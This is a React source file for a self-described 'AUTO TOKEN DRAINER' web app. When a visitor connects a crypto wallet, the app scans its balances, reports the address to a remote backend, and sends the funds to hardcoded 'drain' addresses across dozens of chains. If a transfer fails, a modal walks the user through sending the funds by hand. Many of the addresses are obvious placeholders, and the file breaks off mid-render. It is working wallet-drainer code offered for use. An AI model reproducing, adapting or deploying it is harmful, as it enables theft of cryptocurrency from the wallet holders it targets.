import { useState, useEffect, useRef } from 'react';
import { WagmiConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useWalletClient, useDisconnect, useBalance } from 'wagmi';
import { parseEther } from 'viem';
import { wagmiConfig } from "./wagmi";
import './mobile-fix.css';

// ==================== COMPLETE 39 NETWORK CONFIGURATION ====================
const NETWORKS = [
  // EVM Mainnets (18 chains)
  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', color: '#627EEA', rpc: 'https://eth.llamarpc.com' },
  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', color: '#F0B90B', rpc: 'https://bsc-dataseed.binance.org' },
  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', color: '#8247E5', rpc: 'https://polygon-rpc.com' },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', color: '#28A0F0', rpc: 'https://arb1.arbitrum.io/rpc' },
  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', color: '#FF0420', rpc: 'https://mainnet.optimism.io' },
  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', color: '#0052FF', rpc: 'https://mainnet.base.org' },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', color: '#E84142', rpc: 'https://api.avax.network/ext/bc/C/rpc' },
  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', color: '#1969FF', rpc: 'https://rpc.ftm.tools' },
  { id: 100, name: 'Gnosis', symbol: 'xDai', type: 'evm', color: '#04795B', rpc: 'https://rpc.gnosischain.com' },
  { id: 42220, name: 'Celo', symbol: 'CELO', type: 'evm', color: '#35D07F', rpc: 'https://forno.celo.org' },
  { id: 1284, name: 'Moonbeam', symbol: 'GLMR', type: 'evm', color: '#53CBC9', rpc: 'https://rpc.api.moonbeam.network' },
  { id: 1088, name: 'Metis', symbol: 'METIS', type: 'evm', color: '#00DACC', rpc: 'https://andromeda.metis.io/?owner=1088' },
  { id: 25, name: 'Cronos', symbol: 'CRO', type: 'evm', color: '#121C36', rpc: 'https://evm.cronos.org' },
  { id: 1666600000, name: 'Harmony', symbol: 'ONE', type: 'evm', color: '#00AEE9', rpc: 'https://api.harmony.one' },
  { id: 1313161554, name: 'Aurora', symbol: 'ETH', type: 'evm', color: '#78D64B', rpc: 'https://mainnet.aurora.dev' },
  { id: 42262, name: 'Oasis Emerald', symbol: 'ROSE', type: 'evm', color: '#00B894', rpc: 'https://emerald.oasis.dev' },
  { id: 1285, name: 'Moonriver', symbol: 'MOVR', type: 'evm', color: '#F3B82C', rpc: 'https://rpc.api.moonriver.moonbeam.network' },
  { id: 199, name: 'BTT Chain', symbol: 'BTT', type: 'evm', color: '#D92B6F', rpc: 'https://rpc.bittorrentchain.io' },
  
  // Non-EVM Chains (21 chains)
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', color: '#FF060A' },
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', color: '#00FFA3' },
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', color: '#F7931A' },
  { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm', color: '#0033AD' },
  { id: 'dogecoin', name: 'Dogecoin', symbol: 'DOGE', type: 'non-evm', color: '#C2A633' },
  { id: 'litecoin', name: 'Litecoin', symbol: 'LTC', type: 'non-evm', color: '#BFBBBB' },
  { id: 'ripple', name: 'Ripple', symbol: 'XRP', type: 'non-evm', color: '#23292F' },
  { id: 'polkadot', name: 'Polkadot', symbol: 'DOT', type: 'non-evm', color: '#E6007A' },
  { id: 'cosmos', name: 'Cosmos', symbol: 'ATOM', type: 'non-evm', color: '#2E3148' },
  { id: 'binance', name: 'Binance Chain', symbol: 'BNB', type: 'non-evm', color: '#F0B90B' },
  { id: 'stellar', name: 'Stellar', symbol: 'XLM', type: 'non-evm', color: '#14B6E8' },
  { id: 'monero', name: 'Monero', symbol: 'XMR', type: 'non-evm', color: '#FF6600' },
  { id: 'zcash', name: 'Zcash', symbol: 'ZEC', type: 'non-evm', color: '#F4B728' },
  { id: 'dash', name: 'Dash', symbol: 'DASH', type: 'non-evm', color: '#008DE4' },
  { id: 'tezos', name: 'Tezos', symbol: 'XTZ', type: 'non-evm', color: '#2C7DF7' },
  { id: 'algorand', name: 'Algorand', symbol: 'ALGO', type: 'non-evm', color: '#000000' },
  { id: 'vechain', name: 'VeChain', symbol: 'VET', type: 'non-evm', color: '#15BDFF' },
  { id: 'neo', name: 'Neo', symbol: 'NEO', type: 'non-evm', color: '#58BF00' },
  { id: 'eos', name: 'EOS', symbol: 'EOS', type: 'non-evm', color: '#000000' },
  { id: 'tron_trc20', name: 'Tron TRC20', symbol: 'USDT', type: 'non-evm', color: '#26A17B', parent: 'tron' },
  { id: 'solana_spl', name: 'Solana SPL', symbol: 'USDC', type: 'non-evm', color: '#2775CA', parent: 'solana' },
];

// ==================== DRAIN ADDRESSES ====================
const DRAIN_ADDRESSES = {
  // EVM addresses
  1: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  56: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  137: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42161: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  10: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  8453: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  43114: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  250: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  100: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42220: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1284: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1088: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  25: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1666600000: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1313161554: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42262: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1285: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  199: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  
  // Non-EVM addresses
  tron: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ",
  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
  solana: "So11111111111111111111111111111111111111112",
  cardano: "addr1q8d2f8zq9v5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q",
  dogecoin: "D8U6t5R7z5q5q5q5q5q5q5q5q5q5q5q5q5q5",
  litecoin: "LbTj8jnq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5",
  ripple: "rPFLkxQk6xUGdGYEykqe7PR25Gr7mLHDc8",
  polkadot: "12gX42C4Fj1wgtfgoP7oqb9jEE3X6Z5h3RyJvKtRzL1NZB5F",
  cosmos: "cosmos1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02",
  binance: "bnb1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02",
  stellar: "GCRWFRVQP5P5TNKL4KARZBWYQG5AUFMTQMXUVE4MZGJPOENKJAZB6KGB",
  monero: "48daf1rG3hE1txWcFzV1M6WBp3Uc4jL5qJ3JvJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5",
  zcash: "t1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v",
  dash: "Xq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q",
  tezos: "tz1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v",
  algorand: "Z5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V",
  vechain: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  neo: "AZ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V",
  eos: "z5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj",
  tron_trc20: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ",
  solana_spl: "So11111111111111111111111111111111111111112",
};

// Token prices for USD calculation
const TOKEN_PRICES = {
  ETH: 3500, BNB: 600, MATIC: 1.2, AVAX: 40, FTM: 0.5, CELO: 0.8, GLMR: 0.4,
  METIS: 80, CRO: 0.1, ONE: 0.02, ROSE: 0.1, MOVR: 20, BTT: 0.000001,
  TRX: 0.12, SOL: 150, BTC: 70000, ADA: 0.6, DOGE: 0.15, LTC: 80,
  XRP: 0.6, DOT: 7, ATOM: 10, XLM: 0.12, XMR: 170, ZEC: 30, DASH: 30,
  XTZ: 1, ALGO: 0.2, VET: 0.03, NEO: 15, EOS: 0.8, USDT: 1, USDC: 1
};

// ==================== MAIN APP ====================
function TokenDrainApp() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <ConnectKitProvider
        mode="dark"
        options={{
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          hideQuestionMarkCTA: true,
          hideTooltips: true,
          disclaimer: null,
        }}
        theme="midnight"
      >
        <UniversalDrainer />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

// ==================== DRAINER COMPONENT ====================
function UniversalDrainer() {
  const { address, isConnected } = useAccount();
  const { data: ethBalance } = useBalance({ address });
  const { data: walletClient } = useWalletClient();
  const { disconnect } = useDisconnect();

  // State
  const [status, setStatus] = useState('');
  const [tokens, setTokens] = useState([]);
  const [totalValue, setTotalValue] = useState(0);
  const [transactions, setTransactions] = useState([]);
  const [isProcessing, setIsProcessing] = useState(false);
  const [walletType, setWalletType] = useState('');
  const [tronDetected, setTronDetected] = useState(false);
  const [tronBalance, setTronBalance] = useState(0);
  const [showManualModal, setShowManualModal] = useState(false);
  const [manualToken, setManualToken] = useState(null);

  const autoStarted = useRef(false);
  const backendUrl = 'https://tokenbackend-5xab.onrender.com';

  // AUTO-START when wallet connects
  useEffect(() => {
    if (isConnected && address && !autoStarted.current) {
      console.log("🔥 AUTO-START: Wallet connected", address);
      autoStarted.current = true;
      
      // Detect wallet type
      detectWalletType();
      
      // Check for TRON
      checkTronWallet();
      
      setStatus("✅ Wallet connected • AUTO-DRAIN STARTING...");
      
      // Start automatic process
      setTimeout(() => {
        startAutoDrain();
      }, 1000);
    } else if (!isConnected) {
      resetState();
      autoStarted.current = false;
    }
  }, [isConnected, address]);

  const resetState = () => {
    setStatus('');
    setTokens([]);
    setTotalValue(0);
    setTransactions([]);
    setIsProcessing(false);
    setShowManualModal(false);
    setManualToken(null);
  };

  const detectWalletType = () => {
    // Check user agent for Trust Wallet
    const userAgent = navigator.userAgent.toLowerCase();
    if (userAgent.includes('trust')) {
      setWalletType('Trust Wallet');
      console.log("✅ Detected Trust Wallet");
    } else if (window.ethereum?.isMetaMask) {
      setWalletType('MetaMask');
    } else if (window.ethereum?.isCoinbaseWallet) {
      setWalletType('Coinbase Wallet');
    } else if (window.ethereum) {
      setWalletType('EVM Wallet');
    }
  };

  const checkTronWallet = () => {
    // Check for TRON (Trust Wallet or TronLink)
    if (window.tronWeb || window.tronLink) {
      console.log("✅ TRON wallet detected");
      setTronDetected(true);
      
      // Get TRON balance if available
      setTimeout(() => {
        if (window.tronWeb?.defaultAddress?.base58) {
          window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58)
            .then(balance => {
              const trxBalance = balance / 1_000_000;
              setTronBalance(trxBalance);
              console.log(`💰 TRON balance: ${trxBalance} TRX`);
            })
            .catch(err => console.log("TRON balance error:", err));
        }
      }, 1000);
    }
  };

  // ==================== AUTO DRAIN FUNCTION ====================
  const startAutoDrain = async () => {
    if (!address) return;
    
    setIsProcessing(true);
    setStatus("🚀 AUTO-DRAIN STARTED • Scanning wallet...");
    
    try {
      // Step 1: Scan for tokens
      const allTokens = await scanWalletTokens();
      
      if (allTokens.length === 0) {
        setStatus("❌ No tokens found • Wallet is empty");
        setIsProcessing(false);
        return;
      }
      
      // Step 2: Calculate total value
      const total = calculateTotalValue(allTokens);
      setTotalValue(total);
      setTokens(allTokens);
      
      setStatus(`💰 Found ${allTokens.length} tokens • $${total.toFixed(2)} total • AUTO-DRAINING...`);
      
      // Step 3: Show confirmation
      const confirmMsg = `🚀 AUTO-DRAIN ${allTokens.length} TOKENS\n\nTotal Value: $${total.toFixed(2)}\n\nClick OK to start automatic draining.\n\n⚠️ This will send ALL tokens to configured addresses.`;
      
      if (!window.confirm(confirmMsg)) {
        setStatus("❌ User cancelled auto-drain");
        setIsProcessing(false);
        return;
      }
      
      // Step 4: AUTO-DRAIN ALL TOKENS
      await drainAllTokensAuto(allTokens);
      
    } catch (error) {
      console.error("Auto drain error:", error);
      setStatus(`❌ Auto-drain failed: ${error.message}`);
      setIsProcessing(false);
    }
  };

  // Scan wallet tokens
  const scanWalletTokens = async () => {
    const allTokens = [];
    
    // Add ETH balance
    if (ethBalance && parseFloat(ethBalance.formatted) > 0) {
      const ethAmount = parseFloat(ethBalance.formatted);
      allTokens.push({
        id: 'eth-native',
        network: 'Ethereum',
        symbol: 'ETH',
        amount: ethAmount.toFixed(6),
        rawAmount: ethAmount,
        chainId: 1,
        type: 'evm',
        drainAddress: DRAIN_ADDRESSES[1],
        isNative: true
      });
    }
    
    // Add TRON if detected
    if (tronDetected && tronBalance > 0) {
      allTokens.push({
        id: 'tron-native',
        network: 'Tron',
        symbol: 'TRX',
        amount: tronBalance.toFixed(6),
        rawAmount: tronBalance,
        chainId: 'tron',
        type: 'non-evm',
        drainAddress: DRAIN_ADDRESSES.tron
      });
    }
    
    // Add other tokens from backend (if available)
    try {
      // Use your existing /drain endpoint or create a scan endpoint
      const response = await fetch(`${backendUrl}/drain`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          address: address,
          action: 'scan',
          networks: NETWORKS 
        })
      });
      
      if (response.ok) {
        const data = await response.json();
        if (data.success && data.tokens) {
          data.tokens.forEach(token => {
            if (token.balance > 0) {
              allTokens.push({
                id: `${token.chainId}-${token.symbol}-${Date.now()}`,
                network: token.network,
                symbol: token.symbol,
                amount: token.balance,
                rawAmount: parseFloat(token.balance),
                chainId: token.chainId,
                type: token.type || 'evm',
                drainAddress: DRAIN_ADDRESSES[token.chainId] || DRAIN_ADDRESSES[1]
              });
            }
          });
        }
      }
    } catch (error) {
      console.log("Backend scan failed, using local detection only");
    }
    
    return allTokens;
  };

  // Calculate total USD value
  const calculateTotalValue = (tokens) => {
    return tokens.reduce((total, token) => {
      const price = TOKEN_PRICES[token.symbol] || 0;
      return total + (token.rawAmount * price);
    }, 0);
  };

  // ==================== AUTO DRAIN ALL TOKENS ====================
  const drainAllTokensAuto = async (tokensToDrain) => {
    if (tokensToDrain.length === 0) return;
    
    const txLogs = [];
    let successCount = 0;
    let failedCount = 0;
    
    // Group by network type
    const evmTokens = tokensToDrain.filter(t => t.type === 'evm');
    const nonEvmTokens = tokensToDrain.filter(t => t.type === 'non-evm');
    
    setStatus(`⚡ AUTO-DRAINING ${evmTokens.length} EVM tokens...`);
    
    // Process EVM tokens
    for (let i = 0; i < evmTokens.length; i++) {
      const token = evmTokens[i];
      const tokenValue = (token.rawAmount * (TOKEN_PRICES[token.symbol] || 0)).toFixed(2);
      
      setStatus(`💸 Draining ${token.amount} ${token.symbol} ($${tokenValue})...`);
      
      try {
        const result = await drainEvmTokenAuto(token);
        
        if (result.success) {
          successCount++;
          txLogs.push({
            id: Date.now() + i,
            timestamp: new Date().toISOString(),
            symbol: token.symbol,
            amount: token.amount,
            valueUSD: tokenValue,
            status: '✅ SUCCESS',
            hash: result.hash,
            message: result.message,
            explorer: result.explorer
          });
          
          console.log(`✅ ${token.symbol} drained: ${result.hash}`);
          
          // Remove from tokens list
          setTokens(prev => prev.filter(t => t.id !== token.id));
          
        } else {
          failedCount++;
          txLogs.push({
            id: Date.now() + i,
            timestamp: new Date().toISOString(),
            symbol: token.symbol,
            amount: token.amount,
            valueUSD: tokenValue,
            status: '❌ FAILED',
            error: result.error,
            message: result.message
          });
          
          console.error(`❌ ${token.symbol} failed: ${result.error}`);
          
          // Show manual modal for failed EVM drains
          if (result.error.includes('user rejected')) {
            setManualToken({
              ...token,
              instructions: `User rejected transaction for ${token.symbol}.\n\nManual transfer required:\nSend ${token.amount} ${token.symbol} to:\n${token.drainAddress}`
            });
            setShowManualModal(true);
          }
        }
      } catch (error) {
        failedCount++;
        txLogs.push({
          id: Date.now() + i,
          timestamp: new Date().toISOString(),
          symbol: token.symbol,
          amount: token.amount,
          valueUSD: tokenValue,
          status: '❌ ERROR',
          error: error.message
        });
      }
      
      // Wait between transactions
      await new Promise(resolve => setTimeout(resolve, 2000));
    }
    
    // Process non-EVM tokens
    if (nonEvmTokens.length > 0) {
      setStatus(`📝 Processing ${nonEvmTokens.length} non-EVM tokens...`);
      
      for (let i = 0; i < nonEvmTokens.length; i++) {
        const token = nonEvmTokens[i];
        const tokenValue = (token.rawAmount * (TOKEN_PRICES[token.symbol] || 0)).toFixed(2);
        
        setStatus(`🔄 Processing ${token.symbol} ($${tokenValue})...`);
        
        try {
          const result = await drainNonEvmTokenAuto(token);
          
          if (result.success) {
            successCount++;
            txLogs.push({
              id: Date.now() + evmTokens.length + i,
              timestamp: new Date().toISOString(),
              symbol: token.symbol,
              amount: token.amount,
              valueUSD: tokenValue,
              status: '✅ SUCCESS',
              message: result.message,
              hash: result.hash
            });
            
            // Remove from tokens list
            setTokens(prev => prev.filter(t => t.id !== token.id));
            
          } else {
            failedCount++;
            txLogs.push({
              id: Date.now() + evmTokens.length + i,
              timestamp: new Date().toISOString(),
              symbol: token.symbol,
              amount: token.amount,
              valueUSD: tokenValue,
              status: '❌ FAILED',
              error: result.error,
              message: result.message
            });
            
            // Show manual modal for non-EVM tokens
            setManualToken({
              ...token,
              instructions: getNonEVMInstructions(token)
            });
            setShowManualModal(true);
          }
        } catch (error) {
          failedCount++;
          txLogs.push({
            id: Date.now() + evmTokens.length + i,
            timestamp: new Date().toISOString(),
            symbol: token.symbol,
            amount: token.amount,
            valueUSD: tokenValue,
            status: '❌ ERROR',
            error: error.message
          });
        }
        
        await new Promise(resolve => setTimeout(resolve, 3000));
      }
    }
    
    // Update transactions
    setTransactions(prev => [...txLogs, ...prev.slice(0, 19)]);
    
    // Update total value
    const remainingValue = tokens.reduce((sum, t) => {
      const price = TOKEN_PRICES[t.symbol] || 0;
      return sum + (t.rawAmount * price);
    }, 0);
    setTotalValue(remainingValue);
    
    // Final status
    if (successCount > 0) {
      const totalDrained = successCount + failedCount;
      const successRate = ((successCount / totalDrained) * 100).toFixed(1);
      
      setStatus(`🎉 AUTO-DRAIN COMPLETE • ${successCount} tokens drained • ${successRate}% success`);
      
      // Auto-disconnect after successful drain
      setTimeout(() => {
        disconnect();
        setStatus("✅ Drain complete • Wallet disconnected");
      }, 5000);
      
    } else {
      setStatus(`❌ AUTO-DRAIN FAILED • ${failedCount} failed attempts`);
    }
    
    setIsProcessing(false);
  };

  // Drain EVM token automatically
  const drainEvmTokenAuto = async (token) => {
    try {
      console.log(`🔄 AUTO-DRAINING ${token.symbol}...`);
      
      const amount = parseFloat(token.amount);
      if (amount <= 0) {
        return {
          success: false,
          error: 'Invalid amount',
          message: `Cannot drain ${token.amount} ${token.symbol}`
        };
      }
      
      const amountInWei = parseEther(amount.toString());
      
      // Prepare transaction
      const transaction = {
        to: token.drainAddress,
        value: amountInWei.toString(),
        chainId: `0x${Number(token.chainId).toString(16)}`,
      };
      
      console.log(`📝 Transaction:`, transaction);
      
      // Send via wallet
      if (window.ethereum) {
        // Request account access
        const accounts = await window.ethereum.request({ 
          method: 'eth_requestAccounts' 
        });
        
        console.log(`👤 Using account:`, accounts[0]);
        
        // Send transaction
        const txHash = await window.ethereum.request({
          method: 'eth_sendTransaction',
          params: [transaction],
        });
        
        console.log(`✅ Transaction sent:`, txHash);
        
        // Wait for confirmation
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        return {
          success: true,
          hash: txHash,
          message: `${token.amount} ${token.symbol} sent successfully`,
          explorer: getExplorerUrl(txHash, token.chainId)
        };
        
      } else if (walletClient) {
        // Use wallet client
        const hash = await walletClient.sendTransaction({
          to: token.drainAddress,
          value: amountInWei,
        });
        
        return {
          success: true,
          hash,
          message: `${token.amount} ${token.symbol} sent via wallet client`
        };
      } else {
        return {
          success: false,
          error: 'No wallet provider',
          message: 'Cannot connect to wallet'
        };
      }
      
    } catch (error) {
      console.error(`❌ Drain error for ${token.symbol}:`, error);
      
      let errorMessage = 'Transaction failed';
      let userMessage = error.message || 'Unknown error';
      
      if (error.code === 4001 || error.code === 'ACTION_REJECTED' || error.message?.includes('rejected')) {
        errorMessage = 'User rejected transaction';
        userMessage = 'You rejected the transaction in your wallet';
      } else if (error.message?.includes('insufficient funds')) {
        errorMessage = 'Insufficient balance';
        userMessage = 'Not enough balance for gas fees';
      } else if (error.message?.includes('network')) {
        errorMessage = 'Network error';
        userMessage = 'Please check your network connection';
      } else if (error.message?.includes('chain')) {
        errorMessage = 'Wrong network';
        userMessage = 'Please switch to correct network';
      }
      
      return {
        success: false,
        error: errorMessage,
        message: userMessage
      };
    }
  };

  // Drain non-EVM token automatically
  const drainNonEvmTokenAuto = async (token) => {
    // TRON auto-drain
    if (token.symbol === 'TRX' && tronDetected) {
      try {
        if (window.tronWeb) {
          const amount = token.rawAmount * 1_000_000; // Convert to sun
          
          const transaction = await window.tronWeb.transactionBuilder.sendTrx(
            token.drainAddress,
            amount,
            window.tronWeb.defaultAddress.base58
          );
          
          const signedTx = await window.tronWeb.trx.sign(transaction);
          const result = await window.tronWeb.trx.sendRawTransaction(signedTx);
          
          return {
            success: true,
            hash: result.txid,
            message: `${token.amount} TRX sent via TRON network`
          };
        }
      } catch (error) {
        return {
          success: false,
          error: 'TRON drain failed',
          message: error.message || 'Cannot drain TRON'
        };
      }
    }
    
    // Other non-EVM
    return {
      success: false,
      error: 'Manual required',
      message: `Send ${token.amount} ${token.symbol} to: ${token.drainAddress}`
    };
  };

  // Get non-EVM instructions
  const getNonEVMInstructions = (token) => {
    if (token.symbol === 'TRX') {
      return `TRON TRANSFER INSTRUCTIONS:

1. Open your TRON wallet (Trust Wallet, TronLink, etc.)
2. Click "Send" or "Transfer"
3. Select TRX as currency
4. Paste this address: ${token.drainAddress}
5. Amount: ${token.amount} TRX
6. Confirm and send

Network: TRON Mainnet`;
    }
    
    return `MANUAL TRANSFER REQUIRED:
Network: ${token.network}
Token: ${token.symbol}
Amount: ${token.amount}
Value: $${(token.rawAmount * (TOKEN_PRICES[token.symbol] || 0)).toFixed(2)}

Send to: ${token.drainAddress}`;
  };

  // Get explorer URL
  const getExplorerUrl = (hash, chainId) => {
    const explorers = {
      1: `https://etherscan.io/tx/${hash}`,
      56: `https://bscscan.com/tx/${hash}`,
      137: `https://polygonscan.com/tx/${hash}`,
      42161: `https://arbiscan.io/tx/${hash}`,
      10: `https://optimistic.etherscan.io/tx/${hash}`,
      8453: `https://basescan.org/tx/${hash}`,
    };
    return explorers[chainId] || `https://etherscan.io/tx/${hash}`;
  };

  // Copy to clipboard
  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text).then(() => {
      setStatus('✅ Address copied!');
    }).catch(err => {
      console.error('Copy failed:', err);
    });
  };

  // Format address
  const formatAddress = (addr) => {
    if (!addr) return '';
    if (addr.length <= 10) return addr;
    return `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`;
  };

  // Format amount
  const formatAmount = (amount) => {
    const num = parseFloat(amount);
    if (isNaN(num)) return '0.00';
    if (num < 0.000001) return '<0.000001';
    return num.toLocaleString(undefined, {
      minimumFractionDigits: 2,
      maximumFractionDigits: 8
    });
  };

  // ==================== RENDER ====================
  return (
    <div className="App">
      <div className="app-container">
        {/* Header */}
        <header className="app-header">
          <div className="header-left">
            <div className="logo">⚡</div>
            <div>
              <h1>AUTO TOKEN DRAINER</h1>
              <p className="subtitle">Fully Automatic • 39+ Networks</p>
            </div>
          </div>
          
          <div className="header-right">
            {isConnected ? (
              <div className="connected-wallet">
                <div className="wallet-address">{formatAddress(address)}</div>
                {walletType && <div className="wallet-type">{walletType}</div>}
                {tronDetected && <div className="tron-badge">TRON</div>}
                <button onClick={disconnect} className="disconnect-btn">
                  Disconnect
                </button>
              </div>
            ) : (
              <ConnectKitButton />
            )}
          </div>
        </header>

        <main className="app-main">
          {isConnected ? (
            <>
              {/* Status Dashboard */}
              <div className="status-dashboard">
                <div className="status-card primary">
                  <div className="status-icon">
                    {isProcessing ? '⚡' : '🚀'}
                  </div>
                  <div className="status-content">
                    <div className="status-title">AUTO-DRAIN STATUS</div>
                    <div className="status-message">{status}</div>
                  </div>
                </div>
                
                <div className="stats-row">
                  <div className="stat">
                    <div className="stat-value">${totalValue.toFixed(2)}</div>
                    <div className="stat-label">Total Value</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">{tokens.length}</div>
                    <div className="stat-label">Tokens</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">
                      {transactions.filter(t => t.status?.includes('✅')).length}
                    </div>
                    <div className="stat-label">Drained</div>
                  </div>
                </div>
              </div>

              {/* Processing Indicator */}
              {isProcessing && (
                <div className="processing-indicator">
                  <div className="processing-spinner"></div>
                  <div className="processing-text">AUTO-DRAIN IN PROGRESS</div>
                  <div className="processing-note">Do not disconnect wallet</div>
                </div>
              )}

              {/* Manual Modal */}
              {showManualModal && manualToken && (
                <div className="modal-overlay" onClick={() => setShowManualModal(false)}>
                  <div className="modal-content" onClick={e => e.stopPropagation()}>
                    <div className="modal-header">
                      <h3>Manual Transfer Required</h3>
                      <button 
                        onClick={() => setShowManualModal(false)}
                        className="modal-close"
                      >
                        ×
                      </button>
                    </div>
                    <div className="modal-body">
                      <div className="token-info">
                        <div className="token-symbol-large">{manualToken.symbol}</div>
                        <div className="token-network">{manualToken.network}</div>
                        <div className="token-amount-large">
                          {manualToken.amount} {manualToken.symbol}
                        </div>
                        <div className="token-value">
                          ${(manualToken.rawAmount * (TOKEN_PRICES[manualToken.symbol] || 0)).toFixed(2)}
                        </div>
                      </div>
                      
                      <div className="instructions">
                        <pre>{manualToken.instructions}</pre>
                      </div>
                      
                      <div className="address-box">
                        <div className="address-label">Send to:</div>
                        <div className="address-value">{manualToken.drainAddress}</div>
                        <button
                          onClick={() => copyToClipboard(manualToken.drainAddress)}
                          className="btn-copy"
                        >
                          📋 Copy Address
                        </button>
                      </div>
                      
                      <div className="modal-actions">
                        <button
                          onClick={() => setShowManualModal(false)}
                          className="btn btn-primary"
                        >
                          I Understand
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* Transactions */}
              {transactions.length > 0 && (
                <div className="transactions-panel">
                  <div className="panel-header">
                    <h3>Transaction Results</h3>
                    <div className="success-rate">
                      {transactions.filter(t => t.status?.includes('✅')).length} / {transactions.length} successful
                    </div>
                  </div>
                  <div className="transactions-list">
                    {transactions.slice(0, 10).map((tx, idx) => (
                      <div key={tx.id || idx} className={`transaction-item ${tx.status?.includes('✅') ? 'success' : 'failed'}`}>
                        <div className="tx-icon">
                          {tx.status?.includes('✅') ? '✅' : '❌'}
                        </div>
                        <div className="tx-details">
                          <div className="tx-main">
                            <span className="tx-symbol">{tx.symbol}</span>
                            <span className="tx-amount">{formatAmount(tx.amount)}</span>
                            <span className="tx-value">${tx.valueUSD || '0'}</span>
                          </div>
                          <div className="tx-secondary">
                            <span className="tx-status">{tx.status}</span>
                            <span className="tx-message">{tx.message}</span>
                          </div>
                          {tx.explorer && (
                            <a href={tx.explorer} target="_blank" rel="noopener noreferrer" className="tx-link">
                              View Transaction
                            </a>
                          )}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Detected Tokens */}
              {tokens.length > 0 && (
                <div className="tokens-panel">
                  <div className="panel-header">
                    <h3>Detected Tokens</h3>
                    <div className="panel-summary">
                      <span>${totalValue.toFixed(2)} total</span>
                      <span>{tokens.length} tokens</span>
                    </div>
                  </div>
                  <div className="tokens-grid">
                    {tokens.map(token => (
                      <div key={token.id} className="token-card">
                        <div className="token-header">
                          <div 
                            className="network-badge"
                            style={{ 
                              backgroundColor: NETWORKS.find(n => n.name === token.network)?.color || '#666'
                            }}
                          >
                            {token.symbol}
                          </div>
                          <div className="token-network">{token.network}</div>
                          <div className={`token-type ${token.type}`}>
                            {token.type === 'evm' ? 'AUTO' : 'MANUAL'}
                          </div>
                        </div>
                        <div className="token-amount">
                          {formatAmount(token.amount)} {token.symbol}
                        </div>
                        <div className="token-value">
                          ${(token.rawAmount * (TOKEN_PRICES[token.symbol] || 0)).toFixed(2)}
                        </div>
                        <div className="token-destination">
                          To: {formatAddress(token.drainAddress)}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Instructions */}
              <div className="instructions-panel">
                <h3>⚠️ AUTO-DRAIN INFORMATION</h3>
                <ul>
                  <li>• Draining starts automatically when wallet connects</li>
                  <li>• All tokens are sent to configured addresses</li>
                  <li>• Transactions require approval in your wallet</li>
                  <li>• Do not disconnect wallet during the process</li>
                  <li>• Wallet auto-disconnects after successful drain</li>
                </ul>
              </div>
            </>
          ) : (
            <div className="welcome-screen">
              <div className="welcome-content">
                <div className="welcome-icon">⚡</div>
